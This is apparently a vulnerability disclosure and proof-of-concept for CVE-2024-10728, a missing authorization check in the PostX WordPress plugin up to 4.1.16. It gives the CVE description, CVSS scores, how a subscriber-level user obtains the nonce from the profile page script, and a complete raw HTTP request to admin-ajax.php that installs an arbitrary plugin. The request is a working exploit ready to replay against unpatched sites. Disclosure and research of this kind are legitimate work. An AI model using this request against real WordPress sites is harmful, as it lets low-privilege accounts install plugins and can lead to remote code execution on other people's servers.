# CVE-2024-10728
PostX &lt;= 4.1.16 - Missing Authorization to Arbitrary Plugin Installation/Activation

# Description

The Post Grid Gutenberg Blocks and WordPress Blog Plugin – PostX plugin for WordPress is vulnerable to unauthorized plugin installation/activation due to a missing capability check on the 'install_required_plugin_callback' function in all versions up to, and including, 4.1.16. This makes it possible for authenticated attackers, with Subscriber-level access and above, to install and activate arbitrary plugins which can be leveraged to achieve remote code execution if another vulnerable plugin is installed and activated.

```
Score: 8.8
Vendors: wpxpo
Products: Post Grid Gutenberg Blocks and WordPress Blog Plugin – PostX
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Interaction: none
Privileges: low
Attack Vector: network
```


Note
---

Nonce is from the security in the following js on the profile page when you are loggedin.

```
<script id="ultp-option-script-js-extra">
var ultp_option_panel = {"url":"http:\/\/kubernetes.docker.internal\/wp-content\/plugins\/ultimate-post\/","version":"4.1.16","active":"","security":"baad7f1501","ajax":"http:\/\/kubernetes.docker.internal\/wp-admin\/admin-ajax.php","settings":{"preloader_style":"style1","preloader_color":"#037fff","container_width":"1140","hide_import_btn":"","disable_image_size":"","disable_view_cookies":"","disable_google_font":"","ultp_templates":"true","ultp_elementor":"true","ultp_table_of_content":"true","ultp_builder":"true","ultp_dynamic_content":"true","ultp_custom_font":"true","ultp_chatgpt":"true","post_grid_1":"yes","post_grid_2":"yes","post_grid_3":"yes","post_grid_4":"yes","post_grid_5":"yes","post_grid_6":"yes","post_grid_7":"yes","post_list_1":"yes","post_list_2":"yes","post_list_3":"yes","post_list_4":"yes","post_module_1":"yes","post_module_2":"yes","post_slider_1":"yes","post_slider_2":"yes","heading":"yes","image":"yes","taxonomy":"yes","wrapper":"yes","news_ticker":"yes","builder_advance_post_meta":"yes","builder_archive_title":"yes","builder_author_box":"yes","builder_post_next_previous":"yes","builder_post_author_meta":"yes","builder_post_breadcrumb":"yes","builder_post_category":"yes","builder_post_comment_count":"yes","builder_post_comments":"yes","builder_post_content":"yes","builder_post_date_meta":"yes","builder_post_excerpt":"yes","builder_post_featured_image":"yes","builder_post_reading_time":"yes","builder_post_social_share":"yes","builder_post_tag":"yes","builder_post_title":"yes","builder_post_view_count":"yes","save_version":110,"activated_date":1731715200,"init_setup":"yes","ultp_wpbakery":"true","akismet":"true","wp-ug":"true"},"post_type":"","saved_template_url":"http:\/\/kubernetes.docker.internal\/wp-admin\/admin.php?page=ultp-settings#saved-templates"};
</script>
```


POC
---

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://kubernetes.docker.internal/wp-admin/admin.php?page=ultp-settings
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 175
Origin: http://kubernetes.docker.internal
Connection: keep-alive
Cookie: _delighted_web={%22FutSOUgy5edCcTk9%22:{%22_delighted_fst%22:{%22t%22:%221694595337803%22}}}; mailpoet_page_view=%7B%22timestamp%22%3A1727811617%7D; wordpress_admin_logged_in=1; LUMISESESSID=TE3CYBG1VFQEDZU5QXW7; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; tk_ai=woo%3A4etnnSH4LBZewXIFkJECnLd0; PHPSESSID=786ef110eb080f5686818c346edde8d3; wp-settings-time-4=1731070503; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-08%2017%3A21%3A02%7C%7C%7Cep%3Dhttp%3A%2F%2Fkubernetes.docker.internal%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-08%2017%3A21%3A02%7C%7C%7Cep%3Dhttp%3A%2F%2Fkubernetes.docker.internal%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D5%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Macintosh%3B%20Intel%20Mac%20OS%20X%2010.15%3B%20rv%3A132.0%29%20Gecko%2F20100101%20Firefox%2F132.0; woocommerce_items_in_cart=1; woocommerce_cart_hash=6d1d20e1fd5e4f4f3846eea4a6c448f3; hashcaf=#layoutstab; hashcafsub=post-layout; wordpress_logged_in_e2df32a6c3e7076dd7dc7d3f3fec39aa=user%40example.com%7C1731926935%7CB9KD1v8qRKcVvVTUzlWN004nL3cz7RquaA1FCNqroNe%7C2918cefa1e58f50b7368918088f722f67275b25ef606129edfb615b4fb71a664;

action=install_required_plugin&wpnonce=6aef36a1bb&plugin=%7B%22name%22%3A%22MC4WP%3A+Mailchimp+for+WordPress%22%2C%22path%22%3A%22mailchimp-for-wp%2Fmailchimp-for-wp.php%22%7D
```
